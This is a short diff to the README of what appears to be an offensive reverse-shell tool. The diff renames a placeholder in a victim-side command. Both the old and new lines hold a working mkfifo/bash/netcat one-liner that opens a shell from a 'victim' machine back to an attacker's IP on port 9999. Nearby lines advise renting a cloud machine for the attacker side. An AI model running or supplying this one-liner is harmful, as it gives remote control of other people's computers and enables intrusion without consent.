@@ -55,6 +55,6 @@ Makesure you add your ip to the victim's command.
 * And you can use linode, aws or google cloud services to make your cloud machine.
 
       kali@attacker ~ $ python3 net.py 
-      kali@victim ~ $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <add your ip> 9999 >/tmp/f  
+      kali@victim ~ $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <attacker ip> 9999 >/tmp/f  
            
 Made with 💖 by THB
